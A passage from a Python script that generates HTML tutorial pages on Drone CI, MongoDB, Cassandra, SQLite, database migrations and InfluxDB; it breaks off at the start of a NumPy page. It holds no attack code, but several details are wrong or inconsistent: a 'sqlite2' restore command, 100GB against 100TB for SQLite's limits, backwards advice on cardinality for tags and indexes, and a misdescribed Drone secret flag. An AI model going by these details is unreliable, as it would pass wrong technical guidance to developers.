             "<p>Drone supports parallel step execution — define steps at the same level without <code>depends_on</code> to run them concurrently. For complex workflows, use <strong>parallel pipelines</strong> (multi-pipeline files) that run simultaneously. Combine with <code>depends_on</code> across pipelines for DAG-based execution graphs. Parallel execution dramatically reduces build times — compile frontend and backend simultaneously, run linting and unit tests concurrently.</p>"
             "<p>Service containers run alongside your pipeline as long-lived dependencies. Define services like databases or caches in the <code>services</code> block — Drone starts them before your steps and tears them down after. Each service is reachable via hostname matching the service name. Common examples: <code>services: - name: postgres image: postgres:16 environment: POSTGRES_PASSWORD: password</code>. The application connects to <code>postgres:5432</code>.</p>"
             "<pre><code>kind: pipeline\nname: integration-tests\n\nsteps:\n- name: test\n  image: golang:1.21\n  commands:\n  - go test -v ./...\n\nservices:\n- name: postgres\n  image: postgres:16\n  environment:\n    POSTGRES_PASSWORD: password\n    POSTGRES_DB: testdb\n\n- name: redis\n  image: redis:7-alpine</code></pre>"),
            ("Secrets Management",
             "<p>Never hardcode secrets in pipeline configuration. Drone provides encrypted secrets injected as environment variables at runtime. Create secrets with the CLI: <code>drone secret add --repository org/repo --name docker_password --value \"my-pass\"</code>. Secrets are encrypted using your Drone server's private key and decoded at runtime only for authorized pipelines. Restrict secret usage to specific branches with the <code>--allow-pull-request</code> flag.</p>"
             "<p>Reference secrets in pipeline steps via <code>from_secret</code>. For external secret management, Drone integrates with Vault (via the Vault secret plugin) and Kubernetes secrets. Use <strong>signature verification</strong> for sensitive pipelines — Drone verifies that the <code>.drone.yml</code> file is signed with a trusted GPG key before execution, preventing unauthorized pipeline modifications.</p>"
             "<pre><code>kind: pipeline\nname: docker-push\n\nsteps:\n- name: publish\n  image: plugins/docker\n  settings:\n    username: {from_secret: docker_username}\n    password: {from_secret: docker_password}\n    repo: org/app\n    tags: [latest, \"${DRONE_COMMIT_SHA:0:8}\"]</code></pre>"),
            ("Plugins and Extensions",
             "<p>Drone's plugin system extends pipeline capabilities without writing complex scripts. Plugins are Docker containers that perform specific tasks — Docker build/push, notifications (Slack, email, Discord), code quality reports (SonarQube, Codecov), and cloud deployments (Kubernetes, AWS, Terraform). Browse the plugin marketplace at <a href=\"https://plugins.drone.io/\">plugins.drone.io</a>.</p>"
             "<p>Use <strong>Promotions</strong> to trigger pipelines manually or via API — promote a build from testing to staging to production with different configurations. <strong>Cron jobs</strong> run pipelines on schedules (daily builds, weekly dependency updates). <strong>Downstream triggers</strong> notify dependent repositories after a successful build. For custom logic, write your own plugin in any language — it just needs to read stdin (JSON input) and return exit code 0 for success.</p>"
             "<p>Migrate from Drone 1.x to Drone 2.x (Harness) using the <strong>Harness Code Repository</strong>, which maintains backward compatibility with Drone pipeline syntax while adding native CI/CD integration.</p>"),
        ],
        further=[
            ("Drone CI Documentation", "Official Drone documentation covering pipeline configuration, CLI, and administration.", "https://docs.drone.io/"),
            ("Drone Plugin Marketplace", "Community plugins for CI/CD — Docker, notifications, deployments, and quality tools.", "https://plugins.drone.io/"),
            ("Harness Code Repository", "Drone 2.x by Harness — next-generation CI/CD with Git-native pipelines.", "https://developer.harness.io/"),
        ],
    )

    # ------------------------------------------------------------------------
    # DATABASES (5)
    # ------------------------------------------------------------------------

    build_page(
        title="MongoDB NoSQL Database",
        filename="mongodb-guide.html",
        desc="Master MongoDB — document data model, aggregation pipeline, indexing strategies, replication, and sharding for scalable applications.",
        badge="Databases",
        icon="fas fa-database",
        sections=[
            ("Document Data Model",
             "<p>MongoDB stores data as BSON documents — binary JSON with additional types (ObjectID, Date, Binary, Decimal128). Documents are organized in <strong>collections</strong> (analogous to SQL tables) without enforcing a fixed schema. This flexibility allows polymorphic documents and easy schema evolution. A typical user document: <code>{_id: ObjectId(...), name: \"Alice\", email: \"alice@example.com\", tags: [\"admin\", \"premium\"], address: {city: \"NYC\", zip: \"10001\"}}</code>.</p>"
             "<p>MongoDB uses the <code>_id</code> field as the primary key — auto-generated as an <code>ObjectId</code> unless you provide one. ObjectIds are 12 bytes: 4-byte timestamp, 5-byte random value, 3-byte increment. Design documents to embed related data (denormalization) for fast reads and use references for data that grows unbounded. The document size limit is 16MB — use <strong>GridFS</strong> for larger files (videos, images).</p>"
             "<ul>"
             "<li>Embedding — best for one-to-one and one-to-few relationships</li>"
             "<li>Referencing — best for one-to-many and many-to-many with growth</li>"
             "<li>Schema validation — optional JSON Schema validation in MongoDB 3.6+</li>"
             "<li>Atomic operations — document-level ACID transactions (4.0+ multi-document)</li>"
             "</ul>"),
            ("Aggregation Pipeline",
             "<p>The aggregation pipeline processes documents through a series of stages. Each stage transforms the document stream — filtering (<code>$match</code>), grouping (<code>$group</code>), sorting (<code>$sort</code>), projecting (<code>$project</code>), and joining collections (<code>$lookup</code>). Pipelines are efficient because they stream documents through stages without writing intermediate results.</p>"
             "<p>Common aggregation patterns: <code>$match</code> early to reduce document count, <code>$group</code> for grouping/aggregating (sum, avg, min, max, push), <code>$sort</code> for ordering, <code>$project</code> for reshaping documents, <code>$unwind</code> for exploding arrays, and <code>$lookup</code> for left-outer joins with other collections. Use <code>$bucket</code> for histogram generation and <code>$facet</code> for multi-faceted aggregation in a single pipeline.</p>"
             "<pre><code># Aggregation pipeline — total sales by category\ndb.orders.aggregate([\n  {$match: {status: \"completed\", date: {$gte: ISODate(\"2024-01-01\")}}},\n  {$group: {_id: \"$category\", totalSales: {$sum: \"$amount\"}, count: {$sum: 1}}},\n  {$sort: {totalSales: -1}},\n  {$limit: 10},\n  {$project: {category: \"$_id\", totalSales: 1, count: 1, _id: 0}}\n])</code></pre>"),
            ("Indexing",
             "<p>Indexes dramatically improve query performance by reducing the number of documents scanned. MongoDB supports single-field, compound, multikey (array), text, geospatial (<code>2dsphere</code>), hashed, and TTL (time-to-live) indexes. Use <code>db.collection.createIndex({field: 1})</code> for ascending, <code>-1</code> for descending. Compound indexes support queries on multiple fields — order matters: match the query pattern (equality, then sort, then range).</p>"
             "<p>Analyze query performance with <code>explain(\"executionStats\")</code> — examines <code>totalDocsExamined</code>, <code>totalKeysExamined</code>, <code>executionTimeMillis</code>, and <code>stage</code> (COLLSCAN vs IXSCAN). The <strong>query planner</strong> selects the winning plan from competing indexes. Use <strong>covered queries</strong> (all fields in index) for fastest performance. Monitor slow queries with <code>db.setProfilingLevel(1, 100)</code> (logs queries slower than 100ms). Remove unused indexes with <code>db.collection.dropIndex()</code>.</p>"
             "<p>Best practices: create indexes for all query patterns, limit number of indexes per collection (&lt;20), avoid indexes on high-cardinality fields unnecessarily, and build indexes in the background on production systems.</p>"),
            ("Replication and High Availability",
             "<p>MongoDB replication uses a <strong>replica set</strong> — a group of mongod processes maintaining the same data set. A replica set has one <strong>primary</strong> (accepts writes) and multiple <strong>secondaries</strong> (replicate the primary's oplog). If the primary fails, the replica set elects a new primary (typically within seconds). Applications connect via the connection string: <code>mongodb://host1:27017,host2:27017,host3:27017/?replicaSet=rs0</code>.</p>"
             "<p>Configure replica sets with odd numbers of voting members (3 or 5). Use <strong>arbiters</strong> (non-data-bearing voters) for even numbers. Enable <strong>read preference</strong> to route reads to secondaries: <code>primaryPreferred</code>, <code>secondary</code>, <code>nearest</code>. <strong>Write concern</strong> controls durability — <code>w: majority</code> ensures writes are replicated to most nodes before acknowledging. <strong>Read concern</strong> controls consistency: <code>linearizable</code> for strictest, <code>local</code> for fastest.</p>"
             "<pre><code># Deploy a 3-node replica set\nrs.initiate({\n  _id: \"rs0\",\n  members: [\n    {_id: 0, host: \"mongo1:27017\"},\n    {_id: 1, host: \"mongo2:27017\"},\n    {_id: 2, host: \"mongo3:27017\"}\n  ]\n})</code></pre>"),
        ],
        further=[
            ("MongoDB Documentation", "Official MongoDB docs covering CRUD operations, aggregation, indexing, and administration.", "https://www.mongodb.com/docs/"),
            ("MongoDB University", "Free online courses from MongoDB covering data modeling, aggregation, and Atlas.", "https://university.mongodb.com/"),
            ("MongoDB Blog — Indexing Strategies", "Best practices for indexing MongoDB workloads at scale.", "https://www.mongodb.com/blog/post/best-practices-for-indexing-with-mongodb"),
        ],
    )

    build_page(
        title="Apache Cassandra Database",
        filename="cassandra-guide.html",
        desc="Learn Apache Cassandra — distributed NoSQL database design, CQL query language, data modeling for high-scale applications.",
        badge="Databases",
        icon="fas fa-database",
        sections=[
            ("Distributed Architecture",
             "<p>Apache Cassandra is a distributed NoSQL database designed for high availability, linear scalability, and fault tolerance. It uses a <strong>ring-based architecture</strong> where data is partitioned across nodes using consistent hashing. Each node owns a range of token values, and data is replicated across multiple nodes based on the <strong>replication factor</strong>. There is no single point of failure — any node can accept read/write requests.</p>"
             "<p>Cassandra's architecture features <strong>gossip protocol</strong> for node discovery, <strong>snitches</strong> for network topology awareness, and <strong>anti-entropy</strong> repair mechanisms via Merkle trees. The <strong>partitioner</strong> (Murmur3Partitioner by default) determines how data is distributed across nodes. Write operations are written to a <strong>commit log</strong> (for durability) and a <strong>memtable</strong> (in-memory write buffer), then flushed to <strong>SSTables</strong> on disk.</p>"
             "<ul>"
             "<li>Linear scalability — add nodes without downtime</li>"
             "<li>Tunable consistency — per-query <code>ONE</code>, <code>QUORUM</code>, <code>ALL</code></li>"
             "<li>Multi-datacenter replication — active-active across regions</li>"
             "<li>No single point of failure — fully distributed from day one</li>"
             "</ul>"),
            ("CQL (Cassandra Query Language)",
             "<p>CQL is Cassandra's query language, similar to SQL but designed for Cassandra's distributed model. Key differences: no JOINs, no subqueries, and queries must be optimized for partition access. Define a keyspace (analogous to a database) with <code>CREATE KEYSPACE mykeyspace WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 3}</code>. Tables require a <strong>primary key</strong> consisting of partition key (first column) and optional clustering columns.</p>"
             "<p>CQL data types include <code>uuid</code>, <code>timeuuid</code>, <code>text</code>, <code>int</code>, <code>bigint</code>, <code>boolean</code>, <code>timestamp</code>, <code>map</code>, <code>list</code>, <code>set</code>, and <code>tuple</code>. Use <code>ALLOW FILTERING</code> sparingly — it scans all partitions and impacts performance. Design tables to support your query patterns using the <strong>query-first design</strong> approach: model tables around how you read data, not how you store it.</p>"
             "<pre><code># Create a keyspace and table\nCREATE KEYSPACE store WITH replication = {\n  'class': 'NetworkTopologyStrategy',\n  'datacenter1': 3\n};\n\nCREATE TABLE store.orders (\n  user_id uuid,\n  order_time timestamp,\n  order_id uuid,\n  total decimal,\n  status text,\n  items map<uuid, int>,\n  PRIMARY KEY ((user_id), order_time, order_id)\n) WITH CLUSTERING ORDER BY (order_time DESC);</code></pre>"),
            ("Data Modeling",
             "<p>Cassandra data modeling follows the <strong>query-first</strong> methodology. Unlike relational databases (normalize then query), you start with application queries and design tables to serve each query efficiently. One table per query pattern is common — data duplication is acceptable. The primary goal is to distribute data evenly across the cluster while keeping related data in the same partition for fast reads.</p>"
             "<p>Key modeling concepts: <strong>partition key</strong> determines data distribution (choose high-cardinality keys to avoid hot spots), <strong>clustering columns</strong> determine sort order within a partition, and <strong>secondary indexes</strong> are only for low-cardinality fields or small datasets. Use <strong>materialized views</strong> or <strong>SASI indexes</strong> for alternative access patterns. Avoid batch operations across partitions — use <strong>logged batches</strong> only for atomicity within a single partition.</p>"
             "<pre><code># Design tables for specific queries\n\n# Query: Get recent orders by user\nCREATE TABLE orders_by_user (\n  user_id uuid, order_time timestamp,\n  order_id uuid, total decimal, status text,\n  PRIMARY KEY (user_id, order_time)\n) WITH CLUSTERING ORDER BY (order_time DESC);\n\n# Query: Get orders by status\nCREATE TABLE orders_by_status (\n  status text, order_time timestamp,\n  user_id uuid, order_id uuid, total decimal,\n  PRIMARY KEY (status, order_time)\n) WITH CLUSTERING ORDER BY (order_time DESC);</code></pre>"),
            ("Operations and Maintenance",
             "<p>Cassandra operations require regular maintenance. <strong>Repair</strong> (<code>nodetool repair</code>) synchronizes data across replicas — run weekly during low traffic. <strong>Compaction</strong> merges SSTables for read performance — SizeTieredCompactionStrategy (STCS) for write-heavy, LeveledCompactionStrategy (LCS) for read-heavy. <strong>Hinted handoff</strong> ensures writes are eventually delivered to temporarily down nodes.</p>"
             "<p>Monitoring critical metrics: <code>PendingTasks</code> (compaction backlog), <code>ReadRepairRequests</code>, <code>TotalHints</code> (hinted handoff count), and <code>LiveDiskspaceUsed</code>. Use <code>nodetool cfstats</code> for table-level metrics, <code>nodetool tpstats</code> for thread pool status. Configure <strong>GC Grace Seconds</strong> (default 864000 — 10 days) to prevent premature deletion of tombstones during repairs. Set <code>gc_grace_seconds</code> appropriately for your repair schedule.</p>"
             "<pre><code># Nodetool commands\nnodetool status\nnodetool info\nnodetool cfstats store.orders\nnodetool repair -pr store\n\n# Performance tuning in cassandra.yaml\nconcurrent_reads: 32\nconcurrent_writes: 64\nmemtable_allocation_type: offheap_objects\ncompaction_throughput_mb_per_sec: 64</code></pre>"),
        ],
        further=[
            ("Cassandra Documentation", "Official Apache Cassandra documentation covering architecture, CQL, and configuration.", "https://cassandra.apache.org/doc/latest/"),
            ("DataStax Academy", "Free Cassandra courses from DataStax covering data modeling and administration.", "https://www.datastax.com/learn"),
            ("Cassandra Data Modeling Guide", "Practical guide to designing Cassandra schemas for high-scale applications.", "https://cassandra.apache.org/doc/latest/cassandra/data_modeling/index.html"),
        ],
    )

    build_page(
        title="SQLite Embedded Database",
        filename="sqlite-guide.html",
        desc="Master SQLite — the world's most widely deployed embedded SQL database engine for mobile, desktop, and server applications.",
        badge="Databases",
        icon="fas fa-database",
        sections=[
            ("SQLite Overview",
             "<p>SQLite is a self-contained, serverless, zero-configuration, transactional SQL database engine. Unlike traditional databases (PostgreSQL, MySQL), SQLite runs in-process — there's no separate server process to install, configure, or manage. The entire database is a single file on disk, making it ideal for mobile apps, embedded systems, desktop software, and testing environments.</p>"
             "<p>Key features include full ACID transactions (via rollback journal or WAL mode), support for the SQL standard (triggers, views, CTEs, window functions, partial indexes), and an extremely small footprint (&lt; 600KB compiled). SQLite is the most deployed database engine in the world — every smartphone has thousands of SQLite databases used by applications and the OS itself.</p>"
             "<ul>"
             "<li>Serverless — no installation, configuration, or management overhead</li>"
             "<li>Zero-configuration — just open a file and start querying</li>"
             "<li>Self-contained — single library with no external dependencies</li>"
             "<li>Reliable — 100% branch test coverage, used on spacecraft and ATMs</li>"
             "</ul>"),
            ("Performance Characteristics",
             "<p>SQLite performs best for moderate concurrency and datasets. Single-writer concurrency is enforced by database-level locking — multiple readers can access simultaneously, but only one writer at a time. For most desktop and mobile applications, this is perfectly adequate. Performance degrades with very high write concurrency or databases exceeding 100GB.</p>"
             "<p>Key performance optimization: use <strong>WAL (Write-Ahead Log) mode</strong> (<code>PRAGMA journal_mode=WAL;</code>) for better concurrent read/write performance. Set <strong>cache size</strong> appropriately (<code>PRAGMA cache_size=-64000;</code> for 64MB). Use <strong>prepared statements</strong> for repeated queries. Batch inserts within transactions — each transaction creates one fsync, so wrapping 1000 inserts in a single transaction is 1000x faster than 1000 individual transactions. Use <code>EXPLAIN QUERY PLAN</code> to verify index usage.</p>"
             "<pre><code># Enable WAL mode for better concurrency\nPRAGMA journal_mode=WAL;\nPRAGMA synchronous=NORMAL;\nPRAGMA cache_size=-64000;\nPRAGMA foreign_keys=ON;\n\n# Create an index for better query performance\nCREATE INDEX idx_orders_user ON orders(user_id);\n\n# Check query plan\nEXPLAIN QUERY PLAN SELECT * FROM orders WHERE user_id = 'abc';</code></pre>"),
            ("Use Cases and Limitations",
             "<p>SQLite excels in scenarios requiring minimal setup and overhead. Common use cases include: <strong>mobile applications</strong> (iOS/Android on-device storage), <strong>desktop applications</strong> (config files, local caches), <strong>embedded systems</strong> (IoT devices, routers), <strong>testing</strong> (in-memory databases for unit tests with <code>:memory:</code>), <strong>data analysis</strong> (lightweight analytics on CSV exports via <code>.import</code>), and <strong>prototyping</strong> (quick database design before migrating to client-server).</p>"
             "<p>When NOT to use SQLite: high write concurrency (many simultaneous writers), very large datasets (&gt; 100TB), client-server architectures (multiple machines), or workloads requiring row-level security. For these scenarios, migrate to PostgreSQL, MySQL, or dedicated SQL databases. SQLite also lacks stored procedures and user management — access control is delegated to the file system.</p>"
             "<pre><code># Import CSV into SQLite\nsqlite3 database.db\n.mode csv\n.import data.csv my_table\n\n# Run queries directly from command line\nsqlite3 database.db \"SELECT user_id, COUNT(*) FROM orders GROUP BY user_id;\"\n\n# Dump and restore\nsqlite3 database.db .dump > backup.sql\nsqlite2 database.db < backup.sql</code></pre>"),
            ("SQLite in Python",
             "<p>Python ships with the <code>sqlite3</code> module in the standard library — no additional dependencies. Connect with <code>conn = sqlite3.connect('database.db')</code> or <code>conn = sqlite3.connect(':memory:')</code> for in-memory databases. Use <strong>parameterized queries</strong> (<code>?</code> placeholders) to prevent SQL injection and improve performance. Use <strong>context managers</strong> for automatic transaction handling.</p>"
             "<p>Enable <code>row_factory = sqlite3.Row</code> for column-name access. Use <code>executemany</code> for batch inserts and <code>executescript</code> for running <code>.sql</code> files. Register custom <strong>adapters and converters</strong> for Python types like <code>datetime</code>, <code>uuid</code>, and <code>decimal</code>. For ORM-like functionality without heavy frameworks, use <code>peewee</code> or <code>sqlalchemy</code> with SQLite backend.</p>"
             "<pre><code>import sqlite3\n\nconn = sqlite3.connect('app.db')\nconn.row_factory = sqlite3.Row\nconn.execute('''CREATE TABLE IF NOT EXISTS users (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    name TEXT NOT NULL,\n    email TEXT UNIQUE NOT NULL\n)''')\nconn.execute('INSERT INTO users (name, email) VALUES (?, ?)',\n             ('Alice', 'alice@example.com'))\nconn.commit()\n\nfor row in conn.execute('SELECT * FROM users'):\n    print(row['name'], row['email'])</code></pre>"),
        ],
        further=[
            ("SQLite Documentation", "Official SQLite documentation — comprehensive reference for SQL syntax, pragmas, and C API.", "https://www.sqlite.org/docs.html"),
            ("SQLite Tutorial", "Practical tutorial covering SQLite from installation to advanced features.", "https://www.sqlitetutorial.net/"),
            ("Python sqlite3 Module", "Python standard library documentation for the sqlite3 module.", "https://docs.python.org/3/library/sqlite3.html"),
        ],
    )

    build_page(
        title="Database Migrations & Schema Management",
        filename="database-migrations.html",
        desc="Manage database schema changes safely and consistently using migration tools like Flyway, Alembic, and Liquibase.",
        badge="Databases",
        icon="fas fa-database",
        sections=[
            ("Schema Migration Principles",
             "<p>Database migrations are version-controlled changes to database schema — creating tables, adding columns, creating indexes, and seeding data. The core principle is <strong>evolutionary database design</strong>: schema changes are applied incrementally, tracked in version control, and repeatable across environments. Each migration is a small, reversible step that transforms the database from one version to the next.</p>"
             "<p>Best practices for migrations: (1) every migration must be backward-compatible with the previous version of the application code, (2) always test migrations against a copy of production data, (3) keep migrations small and focused on a single change, (4) never modify a committed migration — create a new one instead, and (5) write both upgrade and rollback scripts. Use <strong>schema version tables</strong> to track which migrations have been applied to each environment.</p>"
             "<ul>"
             "<li>All changes in version control — git &gt; database-ddl.sql</li>"
             "<li>Repeatable across dev, staging, production</li>"
             "<li>Immutable migrations — never edit after commit</li>"
             "<li>Automated in CI/CD — migrations run during deployment</li>"
             "</ul>"),
            ("Flyway for Java/Spring",
             "<p>Flyway is the most popular Java migration tool. It uses SQL-based migrations with filenames following the pattern <code>V1__description.sql</code>, <code>V2__add_column.sql</code>, etc. Flyway creates a <code>flyway_schema_history</code> table to track applied migrations. Run migrations via CLI, Maven/Gradle plugin, or API. Key commands: <code>flyway migrate</code> (apply pending), <code>flyway info</code> (show status), <code>flyway validate</code> (check checksums), and <code>flyway undo</code> (Enterprise only — use versioned rollbacks instead).</p>"
             "<p>Spring Boot integrates Flyway automatically — place migration files in <code>src/main/resources/db/migration/</code> and Spring runs them on startup. Use <code>spring.flyway.baseline-on-migrate: true</code> to baseline an existing database. For production safety, use <code>flyway outOfOrder=true</code> to apply missed migrations from feature branches. Use <strong>repeatable migrations</strong> (starting with <code>R__</code>) for views, stored procedures, and functions that need re-application.</p>"
             "<pre><code>-- V1__create_users.sql\nCREATE TABLE users (\n    id BIGINT AUTO_INCREMENT PRIMARY KEY,\n    name VARCHAR(255) NOT NULL,\n    email VARCHAR(255) UNIQUE NOT NULL\n);\n\n-- V2__add_status.sql\nALTER TABLE users ADD COLUMN status VARCHAR(20) DEFAULT 'active';\n\n-- Run from CLI\nflyway -url=jdbc:postgresql://localhost/mydb migrate\nflyway info</code></pre>"),
            ("Alembic for Python/SQLAlchemy",
             "<p>Alembic is the migration tool for SQLAlchemy (Python). It auto-generates migration scripts by comparing the SQLAlchemy model definitions against the current database state. Initialize with <code>alembic init alembic</code>, configure <code>alembic.ini</code> with the database URL, and edit <code>env.py</code> to import your models. Generate migrations with <code>alembic revision --autogenerate -m \"description\"</code> and apply with <code>alembic upgrade head</code>.</p>"
             "<p>Alembic migration files have <code>upgrade()</code> and <code>downgrade()</code> functions using SQLAlchemy's DDL operations. Manual tweaks are often needed for complex changes like data migrations, column type changes, or index modifications. Use <code>revision --autogenerate</code> as a starting point and review the generated code. For branching, use <code>alembic merge</code> to create merge points. Check history with <code>alembic history</code> and current version with <code>alembic current</code>.</p>"
             "<pre><code># Generated migration\n\"\"\"add user status column\n\nRevision ID: abc123def\n\"\"\"\nfrom alembic import op\nimport sqlalchemy as sa\n\ndef upgrade():\n    op.add_column('users', sa.Column('status', sa.String(20),\n                  server_default='active'))\n\ndef downgrade():\n    op.drop_column('users', 'status')\n\n# Run\nalembic upgrade head\nalembic history\nalembic downgrade -1</code></pre>"),
            ("Zero-Downtime Migrations",
             "<p>Zero-downtime migrations require careful orchestration, especially for large tables. The strategy depends on the change type. <strong>Add column</strong> — use nullable or default values to avoid locking. <strong>Add index</strong> — use <code>CONCURRENTLY</code> (PostgreSQL) or online index creation. <strong>Rename column</strong> — add the new column, dual-write, backfill old data, then drop the old column. <strong>Change column type</strong> — add new column with new type, dual-write, backfill, swap.</p>"
             "<p>Techniques for safe migrations: use <strong>expand-contract</strong> pattern (expand schema, migrate application code, contract schema), run migrations in <strong>batches</strong> to avoid long-running locks, use <strong>pt-online-schema-change</strong> (Percona) or <strong>gh-ost</strong> (GitHub) for zero-downtime MySQL DDL, and always have a <strong>rollback script</strong> ready. Test migration performance on a staging environment with production-scale data before deploying to production.</p>"
             "<pre><code># Expand-contract pattern for renaming a column\n# Phase 1: Expand — add new column\nALTER TABLE users ADD COLUMN full_name VARCHAR(255);\n\n# Application code updated to write to both columns\n\n# Phase 2: Backfill — copy data\nUPDATE users SET full_name = name WHERE full_name IS NULL;\n\n# Phase 3: Contract — remove old column\nALTER TABLE users DROP COLUMN name;</code></pre>"),
        ],
        further=[
            ("Flyway Documentation", "Official Flyway documentation covering installation, workflows, and integrations.", "https://flywaydb.org/documentation/"),
            ("Alembic Documentation", "Official Alembic documentation for auto-generating and managing Python migrations.", "https://alembic.sqlalchemy.org/"),
            ("Liquibase Documentation", "Open-source database change management supporting XML, YAML, JSON, and SQL formats.", "https://docs.liquibase.com/"),
        ],
    )

    build_page(
        title="Time-Series Databases with InfluxDB",
        filename="influxdb-guide.html",
        desc="Learn InfluxDB for time-series data — data model, Flux queries, downsampling, retention policies, IoT and monitoring use cases.",
        badge="Databases",
        icon="fas fa-database",
        sections=[
            ("Data Model",
             "<p>InfluxDB is a purpose-built time-series database for handling high-throughput timestamped data — metrics from servers, IoT sensors, financial tick data, and application performance monitoring. The data model centers on <strong>measurements</strong> (like SQL tables), <strong>tags</strong> (indexed metadata — <code>host</code>, <code>region</code>, <code>service</code>), and <strong>fields</strong> (actual metric values — <code>cpu_usage</code>, <code>temperature</code>). Each data point has a <strong>timestamp</strong> in nanosecond precision.</p>"
             "<p>Line Protocol is the text-based format for writing data: <code>measurement,tag_k=v tag_k2=v2 field_k=v3 timestamp</code>. Example: <code>cpu,host=web01,region=us-east-1 usage_user=45.2,usage_system=12.1 1700000000000000000</code>. Tags are indexed for fast filtering — choose high-cardinality, queryable attributes as tags. Fields are the actual numeric values and are not indexed — keep field counts low for performance. The combination of measurement + tag set + timestamp uniquely identifies a point.</p>"
             "<pre><code># Write line protocol\nsensor_data,sensor_id=temp-01,location=building-a temperature=23.5,humidity=65.2 1700000000000000000\nsensor_data,sensor_id=temp-02,location=building-a temperature=24.1,humidity=62.8 1700000000000000000\n\n# Write via InfluxDB API\ncurl -X POST \"http://localhost:8086/api/v2/write?org=myorg&bucket=metrics&precision=ns\" \\\n  --data-raw \"cpu,host=web01 usage_user=45.2\"</code></pre>"),
            ("Querying with Flux",
             "<p>Flux is InfluxDB's functional query language for working with time-series data. Queries are built from functions chained with pipe-forward operators (<code>|></code>). Start with <code>from()</code> (specify bucket), then <code>range()</code> (time window), <code>filter()</code> (tag/field filtering), and aggregation functions like <code>mean()</code>, <code>max()</code>, <code>count()</code>, <code>quantile()</code>.</p>"
             "<p>Common Flux patterns: <code>aggregateWindow()</code> for downsampling (<code>every: 1h, fn: mean</code>), <code>pivot()</code> for converting series into tabular format, <code>join()</code> for merging multiple streams, <code>map()</code> for transforming values, and <code>alert()</code> for threshold-based notifications. The <code>schema/measurements</code> and <code>schema/tagValues</code> functions explore bucket schema. Use <code>to()</code> to write query results back to InfluxDB for pre-computed downsampled data.</p>"
             "<pre><code>// Query average CPU per hour\nfrom(bucket: \"metrics\")\n  |> range(start: -24h)\n  |> filter(fn: (r) => r._measurement == \"cpu\" and r._field == \"usage_user\")\n  |> aggregateWindow(every: 1h, fn: mean)\n  |> yield(name: \"mean_cpu\")\n\n// Alert on high temperature\nfrom(bucket: \"sensors\")\n  |> range(start: -5m)\n  |> filter(fn: (r) => r._measurement == \"sensor_data\" and r._field == \"temperature\")\n  |> filter(fn: (r) => r._value > 100.0)\n  |> alert(level: \"crit\", message: \"Temperature exceeds 100°C\")</code></pre>"),
            ("Downsampling and Retention",
             "<p>Time-series data accumulates rapidly — a server pushing 100 metrics every 10 seconds generates ~860 million data points per year. <strong>Downsampling</strong> aggregates raw high-resolution data into lower-resolution summaries (e.g., per-second raw → per-hour average). <strong>Retention policies</strong> automatically delete data older than a configurable threshold. InfluxDB v2 uses <strong>buckets</strong> with retention periods for data lifecycle management.</p>"
             "<p>Implement downsampling with <strong>tasks</strong> (Flux scripts running on a schedule). Example: run a task every hour to aggregate raw sensor data into hourly averages stored in a separate <code>downsampled</code> bucket with longer retention. Use <code>option task = {name: \"downsample-sensors\", every: 1h}</code>. Tasks support <strong>exactly-once</strong> semantics and store results in the new bucket. After verifying downsampling works, reduce the raw bucket's retention to save storage costs.</p>"
             "<pre><code>// Downsampling task — hourly averages\noption task = {name: \"hourly-cpu-avg\", every: 1h}\n\nfrom(bucket: \"metrics\")\n  |> range(start: -1h)\n  |> filter(fn: (r) => r._measurement == \"cpu\")\n  |> aggregateWindow(every: 1h, fn: mean)\n  |> set(key: \"_measurement\", value: \"cpu_hourly\")\n  |> to(bucket: \"downsampled_metrics\", org: \"myorg\")</code></pre>"),
            ("Monitoring and Observability Use Cases",
             "<p>InfluxDB powers many monitoring stacks. The <strong>TICK Stack</strong> (Telegraf, InfluxDB, Chronograf, Kapacitor) provides a complete monitoring pipeline. Telegraf is the metrics collection agent — it has 300+ plugins for system metrics, Docker stats, Kubernetes state, database metrics, and cloud APIs. Chronograf is the visualization UI, and Kapacitor handles alerting and stream processing.</p>"
             "<p>Common deployment: run Telegraf on all servers with <code>system</code>, <code>docker</code>, <code>nginx</code>, and <code>postgresql</code> input plugins. Configure <code>outputs.influxdb_v2</code> to send metrics to InfluxDB. Set up <strong>dashboards</strong> in Chronograf or Grafana (InfluxDB is a native Grafana data source). Create alerts in Kapacitor for threshold breaches, rate of change anomalies, and deadman switches. Use <strong>InfluxDB Cloud</strong> for fully managed time-series with built-in monitoring, alerting, and dashboards.</p>"
             "<pre><code># Telegraf configuration (telegraf.conf)\n[[inputs.cpu]]\n  percpu = true\n  totalcpu = true\n[[inputs.disk]]\n  ignore_fs = [\"tmpfs\", \"devtmpfs\"]\n[[inputs.docker]]\n  endpoint = \"unix:///var/run/docker.sock\"\n\n[[outputs.influxdb_v2]]\n  urls = [\"http://localhost:8086\"]\n  token = \"$INFLUX_TOKEN\"\n  organization = \"myorg\"\n  bucket = \"metrics\"</code></pre>"),
        ],
        further=[
            ("InfluxDB Documentation", "Official InfluxDB v2 documentation covering installation, Flux query language, and integrations.", "https://docs.influxdata.com/influxdb/v2/"),
            ("Flux Language Reference", "Complete reference for the Flux query language — functions, types, and patterns.", "https://docs.influxdata.com/flux/v0/"),
            ("Telegraf Plugin List", "Complete list of Telegraf input/output plugins for metrics collection.", "https://docs.influxdata.com/telegraf/v1/plugins/"),
        ],
    )

    # ------------------------------------------------------------------------
    # DATA SCIENCE (10)
    # ------------------------------------------------------------------------

    build_page(
        title="NumPy Deep Dive",
        filename="numpy-deep-dive.html",
        desc="Master NumPy — n-dimensional arrays, vectorization, broadcasting, linear algebra operations for high-performance numerical computing.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Array Creation and Manipulation",
             "<p>NumPy's <code>ndarray</code> is a homogeneous n-dimensional array providing fast C-level operations. Create arrays from lists with <code>np.array([1, 2, 3])</code>, with zeros: <code>np.zeros((3, 4))</code>, ones: <code>np.ones((2, 3))</code>, identity: <code>np.eye(5)</code>, and ranges: <code>np.arange(0, 10, 2)</code>. Use <code>np.linspace(0, 1, 100)</code> for evenly spaced values and <code>np.random.randn(1000)</code> for random samples.</p>"
             "<p>Array attributes: <code>shape</code> (dimensions), <code>dtype</code> (data type — <code>float64</code>, <code>int32</code>, <code>bool</code>), <code>size</code> (total elements), <code>ndim</code> (number of axes). Reshape with <code>arr.reshape(2, 5)</code>, flatten with <code>arr.flatten()</code> or <code>arr.ravel()</code> (no copy). Concatenate with <code>np.concatenate([a, b], axis=0)</code> and split with <code>np.split(arr, 3)</code>. Transpose with <code>arr.T</code> or <code>np.swapaxes()</code>.</p>"
